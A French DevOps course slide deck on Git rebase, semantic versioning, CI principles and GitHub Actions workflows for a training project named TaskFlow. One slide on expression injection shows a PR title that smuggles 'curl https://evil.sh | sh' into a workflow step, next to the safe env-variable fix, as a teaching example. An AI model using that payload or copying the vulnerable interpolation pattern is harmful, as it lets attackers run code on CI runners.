---
marp: true
theme: uncover
paginate: true
footer: CDA - DevOps | ForEach Academy
style: |
  section {
    font-size: 20px;
    padding: 40px 50px;
  }
  h1 { font-size: 36px; color: #2563eb; margin: 0 0 15px 0; }
  h2 { font-size: 28px; color: #1e3a8a; margin: 0 0 12px 0; }
  h3 { font-size: 24px; color: #0ea5e9; margin: 0 0 10px 0; }
  code { font-size: 18px; background: #eff6ff; padding: 1px 4px; border-radius: 4px; }
  table { font-size: 16px; }
  blockquote { border-left: 4px solid #0ea5e9; padding-left: 15px; font-style: italic; color: #4b5563; margin: 10px 0; font-size: 18px; }
  ul { margin: 10px 0; padding-left: 25px; }
  li { margin-bottom: 5px; line-height: 1.3; }
  pre { font-size: 15px; padding: 20px; margin: 15px 0; background: #1e1e1e !important; border-radius: 8px; box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1); }
  pre code { background: transparent !important; color: #d4d4d4; font-size: 15px; }
  .columns { display: grid; grid-template-columns: 1fr 1fr; gap: 1rem; }
---

<!-- _class: lead -->
# Jour 2 — Git avancé & intégration continue

**DevOps — Concepteur Développeur d'Applications**
CDA — ForEach Academy

Formateur : Fabrice Claeys

---

## Programme de la journée

| Horaire | Contenu |
|---------|---------|
| 9h00-9h45 | **2.3 Historique propre et versions** — rebase, rebase interactif, SemVer, tags, releases + 🧪 exercice 2.1 |
| 9h45-10h00 | 🛠️ **Étape 0** — dépôt `taskflow`, ruleset, `docker compose up`, rappel Docker express |
| 10h00-10h40 | **3.1 L'intégration continue** — principes, pyramide des tests, contenu d'un pipeline |
| 10h40-10h50 | *Pause* |
| 10h50-11h35 | **3.2 GitHub Actions** — workflow, jobs, services, matrix, cache, concurrency, artefacts + 🎬 démo |
| 11h35-12h05 | 🧪 **Exercices 2.2 à 2.4** — workflow cassé, déclencheurs, logs en échec |
| 12h05-12h30 | **3.3 Jenkins et GitLab CI** — architecture, syntaxe, correspondance + 🎬 démo |
| 13h30-16h45 | 🛠️ **TP fil rouge, étape 1** — la CI de TaskFlow (pause incluse) |
| 16h45-17h00 | Débrief, quiz, récap |

---

## Objectifs de la journée

À la fin de la journée, vous saurez :

- **Présenter** une branche propre à la revue : rebase, rebase interactif, `fixup!`, `--exec`
- **Versionner** une livraison : SemVer, tag annoté, release GitHub, CHANGELOG
- **Justifier** le contenu d'un pipeline d'intégration continue (quoi, dans quel ordre, en combien de temps)
- **Écrire** un workflow GitHub Actions complet : services, matrice, cache, `concurrency`, couverture, artefacts
- **Protéger** `main` par des checks requis — et éviter les pièges qui bloquent toutes les PR
- **Lire** un `Jenkinsfile` et un `.gitlab-ci.yml`, et choisir un outil en connaissance de cause

> Objectif du soir : chaque PR de TaskFlow affiche quatre checks ; aucune PR rouge ne peut être fusionnée.

---

## Où en est-on ?

```
        ┌──────── plan ◀──────── monitor ◀──────── operate ◀────┐
        │                                                       │
        ▼                                                       │
      code ──▶ build ──▶ test ──▶ release ──▶ deploy ───────────┘
      J1-J2    J2        J2       J3          J3 · J4 (IaC)
     (Git)   (CI)      (CI)     (images,     (staging, prod,
                                 ghcr.io)     monitoring J4, sécurité J3-J5)
```

- **Hier** : culture DevOps, DORA, Git en équipe (PR, revue, ruleset, squash, Conventional Commits)
- **Ce matin** : un historique qui se relit, des versions qui ont un sens ; puis la théorie de la CI et ses outils
- **Cet après-midi** : la CI de TaskFlow, de la première ligne de YAML à la PR bloquée

---

<!-- _class: lead -->
# 2.3 Historique propre et versions

*« Votre PR fait 23 commits dont 9 s'appellent `wip`. »*

---

## Le problème : deux jours de travail, un historique brouillon

```
* 5b8d793 (HEAD -> feature/tri-taches) oups, fichier de debug
* fb6e7b0 docs: documente le tri dans le README
* b0a911a fix typo
* d5773bc tri des taches par statut
* f31aabc wip
| * 8fd55a8 (main) feat(front): client API fetchTasks      ← main a avancé
|/
* 5a1f70e chore: ajoute le .gitignore
```

Deux problèmes distincts :

1. la branche est **en retard** sur `main` (conflits possibles, CI testée sur du code périmé) ;
2. l'historique raconte **votre journée**, pas **l'intention** : le relecteur doit tout dérouler.

> Le ruleset de TaskFlow fusionne en **squash** : sur `main`, une PR = un commit. Mais la **revue** se fait sur les commits de la branche.

---

## Se mettre à jour : merge ou rebase

```
  git merge main                                git rebase main
                C ── D ─────────╮  main                                    main
               /                 ╲                                          ▼
      A ── B                      M             A ── B ── C ── D ── E' ── F'
               \                 ╱                                         ▲
                E ── F ─────────╯  feature                              feature
```

- **merge** : ne réécrit rien, ajoute un commit de fusion `M` à chaque synchronisation
- **rebase** : **rejoue** vos commits au-dessus de `main` ; `E'`, `F'` = même contenu, **nouveaux SHA**

---

## Le rebase, image par image

![w:1100](img/rebase.svg)

---

## Merge ou rebase ?

| | `git merge main` | `git rebase main` |
|---|---|---|
| Historique | vraie chronologie, bifurcations | linéaire |
| Commits existants | intacts | **réécrits** (nouveaux SHA) |
| Conflits | résolus une fois | résolus commit par commit (`rerere` aide) |
| Après coup | `git push` | `git push --force-with-lease` |
| Danger | aucun | sur une branche **partagée** |
| Usage | intégrer une PR dans `main` (ici : squash) | mettre **sa** branche à jour avant / pendant la revue |

> Règle d'or : on ne réécrit que ce que l'on est **seul** à utiliser. Jamais `main` (de toute façon, le ruleset bloque le force-push).

---

## Rebase interactif : réécrire avant de montrer

```console
$ git rebase -i main
```

```text
reword f31aabc wip                                  ← garder, changer le message
fixup  d5773bc tri des taches par statut            ← fondre dans le précédent, jeter le message
fixup  b0a911a fix typo
pick   fb6e7b0 docs: documente le tri dans le README
drop   5b8d793 oups, fichier de debug               ← supprimer
```

| Mot-clé | Effet |
|---|---|
| `pick` / `reword` / `edit` | garder / changer le message / s'arrêter pour modifier le commit |
| `squash` / `fixup` | fusionner avec le précédent en combinant / en jetant le message |
| `drop` | supprimer |
| `exec <cmd>` | lancer une commande à cet endroit (échec = arrêt du rebase) |

Le plus **ancien** commit est **en haut** (l'inverse de `git log`). Perdu : `git rebase --abort`. Regret : `git reflog`.

---

## Trois outils de pro : `fixup!`, `--autosquash`, `--exec`

```console
$ git commit --fixup=f8d2348            # « fixup! feat(api): trie les tâches par statut »
$ git rebase -i --autosquash main       # la liste est déjà rangée : enregistrer
$ git rebase main --exec "npm test"     # chaque commit de la branche est testé
```

- **Réponse à une revue** : un `fixup!` par remarque, visible par le relecteur, fondu avant le merge
- **`--exec`** : un historique où **chaque** commit passe les tests → `git bisect` fiable
- Réglages une fois pour toutes :

```console
$ git config --global rebase.autoSquash true     # --autosquash implicite
$ git config --global rerere.enabled true        # rejoue les résolutions de conflits déjà faites
$ git config --global pull.rebase true           # git pull = fetch + rebase (pas de merge inutile)
```

---

## Pousser après un rebase

```console
$ git push
 ! [rejected]        feature/tri-taches -> feature/tri-taches (non-fast-forward)
$ git push --force-with-lease
 + 7c8d9e0...3f2a1bc feature/tri-taches -> feature/tri-taches (forced update)
```

- `--force-with-lease` refuse d'écraser si la branche distante a bougé depuis votre dernier `fetch`
- `--force` tout court écrase **sans vérifier** : le commit d'un collègue disparaît
- La PR se met à jour, la CI se relance, `dismiss_stale_reviews_on_push` **annule** l'approbation : normal, le code a changé

> Branche partagée avec le binôme ? On se prévient, il fait `git fetch && git reset --hard origin/feature/…` après votre push.

---

## Squash, rebase ou merge pour fusionner la PR ?

| Méthode de merge | Sur `main` | Quand |
|---|---|---|
| **Squash and merge** (choix TaskFlow) | **1** commit par PR, message = **titre** de la PR | PR petites, à une intention ; historique de `main` = liste des changements |
| Rebase and merge | les commits de la branche, rejoués | équipes qui soignent chaque commit (gros projets, `bisect` fin) |
| Merge commit | les commits + un commit de fusion | historique « vrai », mais bruyant |

- Le choix se **décide en équipe** et s'**impose** par le ruleset (*Allowed merge methods*)
- Avec le squash, le **titre de PR** devient le commit : il doit être conventionnel (`feat(api): …`)
- Le rebase interactif reste utile : il sert la **revue**, pas `main`

---

## SemVer : MAJEUR.MINEUR.CORRECTIF

```
                    v  2 . 4 . 1
                       │   │   └── CORRECTIF : bug corrigé, rien ne change pour l'appelant
                       │   └────── MINEUR    : fonctionnalité ajoutée, compatible
                       └────────── MAJEUR    : changement INCOMPATIBLE
```

| Changement dans TaskFlow | Avant | Après |
|---|---|---|
| `/health` renvoyait 200 quand la base était KO | 1.3.1 | **1.3.2** |
| Filtre `GET /api/tasks?done=true` | 1.3.2 | **1.4.0** |
| `/api/tasks` renommé `/api/v2/todos` | 1.4.0 | **2.0.0** |

- `0.x.y` : « l'API peut encore changer » — TaskFlow démarre en `v0.1.0` ce soir
- Avec des Conventional Commits, la version **se déduit** : `fix:` → correctif, `feat:` → mineur, `feat!:` / `BREAKING CHANGE:` → majeur (outils : *release-please*, *semantic-release*)

---

## Tags annotés, releases, CHANGELOG

```console
$ git tag -a v1.4.0 -m "v1.4.0 : tri des tâches par statut"
$ git push origin v1.4.0                     # git push seul n'envoie PAS les tags
$ gh release create v1.4.0 --generate-notes  # notes = liste des PR fusionnées depuis v1.3.2
```

| Objet | Pour qui | Contient |
|---|---|---|
| **Tag annoté** | Git, outils, CI | nom, auteur, date, message ; **immuable** |
| **Release GitHub** | utilisateurs du dépôt | un tag + notes (générées depuis les titres de PR) + fichiers |
| **`CHANGELOG.md`** | utilisateurs, support | l'impact, rédigé (*Keep a Changelog* : Ajouté, Modifié, Corrigé…) |

> Demain, les images seront étiquetées par **SHA court** (traçabilité de chaque build) ; le tag SemVer marque les versions **annoncées**.

---

## 🧪 Exercice 2.1 — Préparer une branche pour la revue (20 min)

`exercices/jour2/01-rebase-interactif.md`

```bash
bash exercices/jour2/rebase-setup.sh
```

1. Analyser la branche : retard sur `main`, intentions, commit à supprimer
2. **Une** commande : `git rebase -i main --exec "node --check api/src/app.js"`
3. Fusion locale, type de fusion ; tag annoté SemVer + entrée de CHANGELOG
4. Bonus : `git commit --fixup` + `--autosquash`, `rerere`

> Question de fin : la branche avait été poussée et votre binôme l'a récupérée. Que faites-vous **avant** le `--force-with-lease` ?

---

<!-- _class: lead -->
# 🛠️ Étape 0 — Mise en place du fil rouge

*15 minutes : un dépôt protégé, une application qui tourne*

---

## Étape 0 : votre dépôt `taskflow`

`tp/fil-rouge-taskflow/etape0-mise-en-place.md`

```bash
cp -r "$FORMATION/tp/fil-rouge-taskflow/starter" ~/taskflow && cd ~/taskflow
echo "*  @<vous> @<binome>" >> .github/CODEOWNERS
git init -b main && git add . && git commit -m "chore: initialise TaskFlow depuis le starter"
gh repo create taskflow --public --source=. --push
gh api -X PUT "repos/{owner}/taskflow/collaborators/<binome>" -f permission=push
gh api -X POST "repos/{owner}/taskflow/rulesets" --input ~/ruleset-main.json
docker compose up -d --build && docker compose ps
```

- Le **ruleset en JSON** reprend les règles d'hier (PR, 1 revue, Code Owners, squash) : versionnable, rejouable
- Cet après-midi, on y **ajoutera** les checks requis
- Vérification : `git push` direct sur `main` → `GH013: Repository rule violations found`

---

## Rappel Docker express : le vocabulaire

| Terme | En une phrase | Dans TaskFlow |
|---|---|---|
| **Image** | modèle figé, construit par un `Dockerfile`, identifié par un tag | `taskflow-api`, `taskflow-front` |
| **Conteneur** | instance jetable d'une image | `taskflow-api-1` |
| **Couche** | une instruction = une couche en cache ; une couche modifiée invalide les suivantes | `COPY package*.json` avant `COPY src` |
| **Volume nommé** | stockage qui survit aux conteneurs | `pgdata` |
| **Réseau Compose** | réseau privé où les services se joignent **par leur nom** | l'API joint `db:5432` |
| **Healthcheck** | « prêt », pas seulement « démarré » | `/health`, `pg_isready` |

> Vous n'écrivez pas de Dockerfile cette semaine : vous les **lisez** et les **justifiez**. Le pipeline les construira.

---

## Lire les fichiers fournis : 6 questions à savoir justifier

1. `api/Dockerfile` : pourquoi copier `package*.json` **avant** `src/` ?
2. Pourquoi `USER node` ? (vérifiez : `docker compose exec api id`)
3. À quoi sert le `HEALTHCHECK`, et pourquoi `/health` répond-il **503** si la base tombe ?
4. `front/Dockerfile` : pourquoi **deux** `FROM` ? Qu'y a-t-il dans l'image finale ?
5. `compose.yaml` : pourquoi un volume **nommé** ? Que fait `down -v` ?
6. Pourquoi seul `front` publie-t-il un port, et comment joint-il l'API ?

> 12 questions dans l'énoncé de l'étape 0 ; deux tirées au sort à la validation. Démo de secours : `demos/demo-compose/`.

---

<!-- _class: lead -->
# 3.1 L'intégration continue

*« Qui a cassé `main` ? » — « J'ai oublié de lancer les tests » — « Ça passe chez moi »*

---

## Une matinée ordinaire sans CI

> Lundi 10h. Karim fusionne sa branche de trois semaines. Conflits partout : il les résout « au mieux ».
> 11h. Léa fusionne la sienne, qui dépendait de l'ancien format de `/api/tasks`. Les tests ? « Je les lance avant la démo. »
> Jeudi. Démo client : page blanche. Personne ne sait **quel** merge a cassé, ni depuis quand.

| Symptôme | Cause | Ce que la CI change |
|---|---|---|
| Fusions douloureuses | branches longues, intégration rare | intégrer **au moins chaque jour**, petites PR |
| « Ça marche chez moi » | environnement implicite | build **reproductible** sur une machine neutre |
| Bug découvert jeudi | tests lancés à la main, parfois | tests **automatiques** à chaque push |
| « Qui a cassé ? » | feedback tardif | verdict en **minutes**, sur la PR, avant le merge |

---

## Définition (Martin Fowler, Kent Beck — *Extreme Programming*)

**Intégration continue** : chaque membre de l'équipe intègre son travail au tronc commun **fréquemment** (au moins une fois par jour) ; chaque intégration est vérifiée par un **build automatisé avec tests**, pour détecter les erreurs **au plus tôt**.

Les pratiques, pas l'outil :

- un **seul** dépôt, une branche principale toujours **saine**
- un build **automatisé** et **reproductible** (lockfile, versions figées, `npm ci`)
- des tests **automatiques**, dans le build
- un verdict **rapide** (objectif : moins de 10 minutes)
- **tout le monde** voit le résultat (sur la PR, badge, notification)

> Un serveur Jenkins sans tests et des branches de trois semaines, ce n'est pas de la CI : c'est de l'**intégration différée automatisée**.

---

## « On ne laisse pas `main` rouge »

- `main` rouge = **tout le monde** est bloqué : on ne sait plus si son propre échec vient de soi
- Règle d'équipe (*stop the line*, Lean) : réparer `main` passe **avant** toute nouvelle fonctionnalité
- Réparer = **corriger vite** ou **revenir en arrière** (`git revert <sha>` : une PR, pas un force-push)
- Prévenir plutôt que réparer :
  - les checks tournent **sur la PR**, sur le commit de fusion simulé
  - le ruleset rend les checks **requis** : le bouton *Merge* est grisé tant que c'est rouge
  - *Require branches to be up to date* : le vert a été obtenu **avec** le `main` actuel

> Un check rouge non bloquant finit toujours ignoré « juste cette fois ».

---

## La pyramide des tests

```
                  ▲  lent, coûteux, fragile
                 ╱ ╲        E2E (navigateur)               peu
                ╱───╲       Playwright : « je crée une tâche dans l'UI »
               ╱     ╲
              ╱───────╲     Intégration                    quelques-uns
             ╱         ╲    API + vrai PostgreSQL (db.int.test.js, 10 tests)
            ╱───────────╲
           ╱             ╲  Unitaires                      beaucoup
          ╱_______________╲ logique, repository mémoire (27 tests, < 1 s)
                  ▼  rapide, bon marché, précis
```

| Niveau | TaskFlow | Dans le pipeline |
|---|---|---|
| Unitaire | `app.test.js`, `memory.test.js`, `api.test.js` (front) | jobs `api`, `front` : à chaque PR |
| Intégration | `db.int.test.js` contre Postgres | job `api-integration` : à chaque PR, service conteneur |
| E2E / smoke | `/health` après déploiement | Jour 3 : smoke test après chaque déploiement |

---

## Ce qu'un pipeline CI doit contenir

| Étape | TaskFlow | Pourquoi à cet endroit |
|---|---|---|
| 1. Installer **à l'identique** | `npm ci` (lockfile) | échoue si `package.json` et lockfile divergent |
| 2. Analyse statique | ESLint, Prettier | le moins cher : quelques secondes, attrape les erreurs bêtes |
| 3. Tests unitaires | Vitest, Node 20 et 22 | rapides, précis |
| 4. Couverture | seuil bloquant (75 %) | empêche de « réparer » en supprimant des tests |
| 5. Tests d'intégration | Vitest + PostgreSQL 16 | les vraies requêtes SQL |
| 6. Build | `vite build`, `docker build` | ce qui ne se voit qu'à la compilation |
| 7. Artefact | `front-dist` | ce qui a été testé est **conservé** |
| (Jour 3) Publier, scanner | images ghcr.io, Trivy | *build once, deploy many* |

> Du moins cher au plus cher : **échouer vite**, et paralléliser ce qui est indépendant.

---

## Le temps est une fonctionnalité du pipeline

```
 Séquentiel :  [npm ci 40s][lint 5s][tests 10s][int 60s][front 50s][docker 90s]   ≈ 4 min 15
 Parallèle  :  [api 20 ──────── 55s]
               [api 22 ──────── 55s]
               [api-integration ─── 1 min 10]
               [front ─────── 50s]                ──▶ [docker-build 1 min 30]   ≈ 2 min 40
```

| Levier | Gain typique | Coût |
|---|---|---|
| Jobs **parallèles** | le pipeline dure le temps du **plus long** job | plus de minutes consommées au total |
| **Cache** npm (clé = lockfile) | `npm ci` 40 s → 10 s | invalidation à chaque changement de dépendance |
| **`concurrency`** | les runs dépassés sont annulés | aucun sur PR ; à éviter sur `main` |
| **Filtres** de chemins | pas de CI pour un `README` | piège des checks requis (voir 3.2) |
| `timeout-minutes` | un job bloqué ne consomme pas 6 h | trop court = échecs aléatoires |

---

## Pourquoi ça vaut le coup : ce que disent les données

- Les études **DORA** (*Accelerate*, rapports annuels *State of DevOps*) relient les pratiques d'intégration continue, de tests automatisés et de branches courtes à de **meilleurs** résultats sur les quatre métriques d'hier : **plus** de déploiements, **moins** d'échecs de changements, restauration **plus rapide**
- Vitesse et stabilité **ne s'opposent pas** : les équipes les plus rapides sont aussi les plus stables
- Le coût d'un défaut **augmente** avec le temps qui sépare son introduction de sa détection : en minutes sur la PR, l'auteur a encore le contexte en tête ; en semaines, il faut enquêter

**Calcul TaskFlow** (ordre de grandeur, à refaire avec vos chiffres) : 4 PR par jour × 3 min de pipeline = 12 min de machine ; une régression attrapée par jour **avant** le merge évite ~1 h d'enquête et de correctif à plusieurs. Le pipeline est rentabilisé dès le premier bug évité.

---

## 💬 À vous : qu'est-ce qui manque ?

Une équipe vous montre « sa CI » :

```yaml
on:
  push:
    branches: [main]
jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v7
      - run: npm install && npm run build
```

En binôme, 3 minutes : listez **au moins cinq** problèmes, du plus grave au moins grave.

<!--
Réponses attendues : ne tourne qu'APRÈS le merge (pas sur pull_request) → main peut être cassée ; aucun test ni lint ; npm install au lieu de npm ci (non reproductible) ; pas de setup-node (version de Node non maîtrisée), pas de cache ; pas de permissions (droits par défaut) ; pas de timeout ; rien n'est requis par une protection de branche ; pas d'artefact.
-->

---

<!-- _class: lead -->
# 3.2 GitHub Actions

*Du concept au `ci.yml` de TaskFlow*

---

## Le vocabulaire

| Terme | Définition | Exemple TaskFlow |
|---|---|---|
| **Workflow** | fichier YAML de `.github/workflows/` | `ci.yml` (aujourd'hui), `release.yml` (demain) |
| **Événement** | ce qui déclenche | `pull_request`, `push` sur `main` |
| **Job** | suite de steps sur **une** machine ; un job = un **check** | `api`, `api-integration`, `front` |
| **Step** | une commande `run:` ou une action `uses:` | `npm ci`, `actions/checkout` |
| **Action** | brique réutilisable, versionnée | `actions/setup-node@v7` |
| **Runner** | la machine qui exécute un job | `ubuntu-latest` (VM neuve, détruite après) |
| **Artefact** | fichiers conservés après le run | `front-dist` |

---

## Anatomie d'un run

```
Événement : pull_request #12 (synchronize)
        │
        ▼
┌─ Workflow CI (.github/workflows/ci.yml) ─────────────────────────────────────┐
│ ┌─ api (20) ──────────┐ ┌─ api (22) ──┐ ┌─ api-integration ─┐ ┌─ front ────┐ │
│ │ checkout            │ │ …           │ │ service postgres  │ │ …          │ │
│ │ setup-node + cache  │ │ Node 22     │ │ npm run test:int  │ │ build      │ │
│ │ npm ci, lint, tests │ │             │ │                   │ │ artefact   │ │
│ └── VM neuve n° 1 ────┘ └── VM n° 2 ──┘ └── VM n° 3 ────────┘ └── VM n° 4 ─┘ │
│                    tous verts ──▶ docker-build (needs: …), VM n° 5           │
└──────────────────────────────────────────────────────────────────────────────┘
```

- Jobs **parallèles** par défaut, chacun sur **sa** VM (rien n'est partagé, sauf artefacts et cache)
- Steps **séquentiels** ; un step en échec saute les suivants (sauf `if: always()`)

---

## Le graphe de jobs de TaskFlow

![w:1050](img/j2-pipeline-ci.svg)

Quatre **checks requis** par le ruleset ; `docker-build` informe, ne bloque pas.

---

## Runners : hébergés ou chez vous

| | `runs-on: ubuntu-latest` | `runs-on: [self-hosted, lab]` (Jour 3) |
|---|---|---|
| Machine | VM neuve à chaque job | la vôtre, persistante |
| Outils | image GitHub (Node, Docker, jq…) | ce que vous installez |
| Réseau | Internet uniquement | votre réseau (la « prod » locale) |
| Coût | gratuit en public, quota en privé | gratuit côté GitHub, à opérer |
| Sécurité | isolation forte | **vous** isolez (dépôt public = danger) |

> Le runner **va chercher** ses jobs chez GitHub (HTTPS sortant) : aucun port à ouvrir. C'est ainsi que demain GitHub déploiera sur votre poste.

---

## YAML en 5 règles (et 3 pièges)

```yaml
name: CI                         # 1. clé: valeur (espace APRÈS les deux-points)
on:
  push:                          # 2. l'indentation (2 espaces) fait la hiérarchie
    branches: [main]             # 3. liste en ligne : [a, b]
jobs:
  api:
    steps:
      - run: npm ci              # 4. liste en colonne : un tiret par élément
      - run: |                   # 5. bloc multi-ligne : barre verticale
          npm run lint
          npm test
```

| Piège | Effet |
|---|---|
| Une **tabulation** | fichier refusé |
| `run:` multi-ligne **sans** `\|` | les lignes sont **repliées** : `npm run lint npm test`, sans erreur |
| `node-version: 20.10` | lu comme le **nombre** 20.1 → mettez des guillemets |

Linter : `docker run --rm -v "$PWD":/repo -w /repo docker.io/rhysd/actionlint:1.7.12`

---

## Déclencheurs et filtres

```yaml
on:
  pull_request:                       # PR ouverte, rouverte, nouveau commit
  push:
    branches: [main]                  # après chaque merge
    paths-ignore: ["**.md", "docs/**"]
  workflow_dispatch:                  # bouton « Run workflow » (Jour 3 : rollback)
  schedule:
    - cron: "0 5 * * 1"               # lundi 5 h UTC (Jour 5 : audit de sécurité)
```

- `pull_request` teste le **commit de fusion simulé** (`refs/pull/N/merge`) : la PR **et** le `main` actuel
- `branches:` ne concerne pas les tags (`tags: ["v*"]`)

> **Piège n° 1 de la semaine** : un filtre `paths` sur `pull_request` + des checks **requis** = la PR « doc seule » ne lance aucun job, les checks restent *Expected — Waiting for status*… **bloquée pour toujours**. Filtrez le `push`, pas la PR.

---

## 🎬 Démo — `demos/demo-actions-hello/`

```bash
DEMO_GH_REPO=hello-actions-demo bash demos/demo-actions-hello/demo.sh
```

- Un push → un run ; le graphe des jobs ; dérouler les steps
- `${{ github.* }}` ; une saisie `workflow_dispatch` passée par `env:`
- `needs` + `outputs` ; une `matrix` → deux checks `Faux tests (20)` et `(22)`
- `$GITHUB_STEP_SUMMARY` : un tableau dans la page du run
- `exit 1` dans une PR → check rouge

> Question : sans `actions/checkout`, que contient la VM ?

---

## Expressions, contextes… et injection

| Contexte | Exemples |
|---|---|
| `github` | `github.sha`, `github.ref_name`, `github.event_name`, `github.event.pull_request.number` |
| `matrix`, `steps`, `needs` | `matrix.node`, `steps.meta.outputs.tag`, `needs.build.outputs.tag` |
| `env`, `vars`, `secrets` | `env.COVERAGE_MIN`, `vars.APP_URL`, `secrets.GITHUB_TOKEN` |
| `inputs` | `inputs.tag` (`workflow_dispatch`) |

`${{ }}` est remplacé **avant** que le shell ne lise le script :

```yaml
# DANGEREUX : un titre de PR « x"; curl https://evil.sh | sh; echo " » devient du shell
- run: echo "PR : ${{ github.event.pull_request.title }}"
# CORRECT : la valeur arrive comme une variable, jamais interprétée
- env:
    TITRE: ${{ github.event.pull_request.title }}
  run: echo "PR : $TITRE"
```

---

## `needs` et `matrix` : l'ordre et la combinatoire

```yaml
jobs:
  api:
    name: api
    strategy:
      fail-fast: false            # Node 22 rouge n'annule pas Node 20
      matrix:
        node: [20, 22]            # 2 jobs → 2 checks : « api (20) », « api (22) »
    steps:
      - uses: actions/setup-node@v7
        with: { node-version: "${{ matrix.node }}" }
  docker-build:
    needs: [api, api-integration, front]   # attend les 4 jobs (toutes les variantes de api)
```

- Pourquoi 20 **et** 22 ? 20 = la version des images (la prod) ; 22 = la prochaine, on détecte les ruptures **avant** de migrer
- Le **nom** du check change avec la matrice : c'est ce nom que le ruleset exige

> Une matrice coûte des minutes à chaque PR : la limiter au job **rapide** (unitaires), pas aux tests d'intégration.

---

## `services:` — un PostgreSQL jetable par job

```yaml
  api-integration:
    services:
      postgres:
        image: postgres:16-alpine                     # même version qu'en dev et en prod
        env: { POSTGRES_USER: taskflow, POSTGRES_PASSWORD: taskflow, POSTGRES_DB: taskflow }
        ports: ["5432:5432"]                          # les steps tournent SUR la VM
        options: >-
          --health-cmd "pg_isready -U taskflow -d taskflow"
          --health-interval 5s --health-timeout 3s --health-retries 10
    env:
      DATABASE_URL: postgres://taskflow:taskflow@localhost:5432/taskflow
```

| Les steps tournent… | Adresse de la base | Il faut |
|---|---|---|
| sur la VM (cas TaskFlow) | `localhost:5432` | `ports:` |
| dans un conteneur (`container: node:20`) | `postgres:5432` (nom du service) | rien de plus |
| dans Compose (dev) | `db:5432` | — |

---

## Le cache : accélérer sans tricher

```yaml
      - uses: actions/setup-node@v7
        with:
          node-version: 20
          cache: npm                                   # met en cache ~/.npm
          cache-dependency-path: api/package-lock.json # clé = hash du lockfile
```

- On met en cache le **téléchargement** (`~/.npm`), pas `node_modules` : `npm ci` reste **exact**
- Clé = contenu du lockfile : une dépendance change → nouvelle clé → cache reconstruit
- Le cache est **partagé** entre branches (lecture de celui de `main`) : jamais de secret dedans
- Mesurez : log d'un run « froid » vs « chaud », ligne `Cache restored successfully`

> Docker a son propre cache (`cache-from: type=gha`) : c'est l'ordre des couches de ce matin qui le rend efficace.

---

## `concurrency` et `timeout-minutes`

```yaml
concurrency:
  group: ci-${{ github.event.pull_request.number || github.ref }}
  cancel-in-progress: ${{ github.event_name == 'pull_request' }}
```

| Situation | Effet |
|---|---|
| deux pushs rapprochés sur la PR n° 12 | même groupe `ci-12` : le premier run est **annulé** |
| deux merges rapprochés sur `main` | même groupe `ci-refs/heads/main`, pas d'annulation : le second **attend** |
| deux PR différentes | groupes différents : en parallèle |

- Pourquoi jamais sur `main` ? Chaque commit de `main` est un **candidat à la livraison** : il lui faut un verdict
- `timeout-minutes: 10` par job : un test qui attend une base absente ne brûle pas **6 h** (défaut)

---

## Artefacts, résumé et annotations

```yaml
      - uses: actions/upload-artifact@v7
        with:
          name: front-dist
          path: front/dist/            # depuis la RACINE (ignore working-directory)
          retention-days: 7
          if-no-files-found: error     # un artefact vide = un échec, pas un warning
```

```bash
echo "| lines | 80.99 % |" >> "$GITHUB_STEP_SUMMARY"                     # Markdown dans la page du run
echo "::error title=Couverture insuffisante::lignes 37 % < seuil 75 %"   # annotation sur la PR
```

- **Artefact** : ce qui a été testé, téléchargeable (rapport, site compilé) ; **cache** : de la vitesse, jetable
- **Résumé** : le verdict lisible sans ouvrir les logs (couverture, durées, liens)

---

## Un seuil de couverture, pour quoi faire ?

```
 PR « nettoyage » : git rm api/tests/app.test.js
   Tests       10 passed | 10 skipped        ← tout est VERT
   Couverture  37 %  <  seuil 75 %           ← le pipeline BLOQUE
```

- Sans seuil, supprimer des tests « qui échouent » rend la CI **verte** : le garde-fou disparaît sans bruit
- Le seuil ne prouve pas la qualité des tests : il empêche la **régression** de couverture
- Le choisir : légèrement sous la valeur actuelle (TaskFlow : ~81 % → 75 %), le remonter au fil du temps
- Mesurer ce qui a du sens : `server.js` (démarrage) est exclu ; le front (DOM) n'a pas de seuil

> CDA : on vous demandera de **justifier** le seuil, pas de réciter un chiffre.

---

## `permissions` : le `GITHUB_TOKEN` au plus juste

```yaml
permissions:
  contents: read            # au niveau du workflow : lecture du dépôt, rien d'autre
```

| Besoin | Permission | Où |
|---|---|---|
| lire le code | `contents: read` | `ci.yml` (tout) |
| publier une image sur ghcr.io | `packages: write` | job `build` de `release.yml` (demain) |
| créer une release | `contents: write` | **un** job dédié |
| commenter une PR | `pull-requests: write` | job dédié |

- Jeton créé pour **chaque** run, expiré à la fin ; droits plafonnés par `permissions:`
- Sans `permissions:`, les droits par défaut du dépôt s'appliquent (souvent écriture)
- Une action compromise ne peut faire que ce que le jeton permet : **moindre privilège**

---

## Checks requis : le contrat de la PR

```json
{ "type": "required_status_checks",
  "parameters": {
    "strict_required_status_checks_policy": true,
    "required_status_checks": [
      { "context": "api (20)", "integration_id": 15368 }, { "context": "api (22)", "integration_id": 15368 },
      { "context": "api-integration", "integration_id": 15368 }, { "context": "front", "integration_id": 15368 } ] } }
```

- `context` = le **nom exact** du check (nom du job + valeur de matrice)
- `integration_id: 15368` = seule l'application *GitHub Actions* peut fournir ce statut (pas un script avec un jeton)
- `strict` = branche à jour avec `main` → rebase de ce matin
- Renommer un job = PR bloquées sur *Expected — Waiting for status to be reported*

> La PR devient un contrat : revue humaine (logique, lisibilité) **et** machine (mécanique). Ni l'une ni l'autre ne suffit.

---

## Lire un log en échec : la méthode

```
Run npm run test:coverage
 FAIL  tests/app.test.js > API TaskFlow > POST /api/tasks > crée une tâche et répond 201
AssertionError: expected 201 to be 200 // Object.is equality
 ❯ tests/app.test.js:42:31
      Tests  1 failed | 26 passed | 10 skipped (37)
##[error]Process completed with exit code 1.
```

1. **Quel job, quel step ?** `api (20)`, `test:coverage` — et `api (22)` ? (même échec = code ; un seul = environnement)
2. **Première** erreur utile (au-dessus de `##[error]`) : attendu 200, obtenu 201
3. **Qu'est-ce qui a changé ?** la PR, ou la différence runner / poste (version de Node, lockfile, service)
4. **Où corriger ?** code, test, lockfile, workflow, ou décision d'équipe
5. **Reproduire** : `cd api && npm ci && npm test` ; `gh run view --log-failed`

> *Re-run* seulement pour un incident externe (réseau, registre). Relancer un test instable sans le corriger, c'est le rendre invisible.

---

## 🧪 Exercices 2.2 à 2.4 (30 min)

`exercices/jour2/`

| # | Exercice | Durée | Ce qu'on entraîne |
|---|---|---|---|
| 2.2 | Le workflow cassé | 12 min | actionlint ; valide ≠ correct ≠ sûr (12 erreurs) |
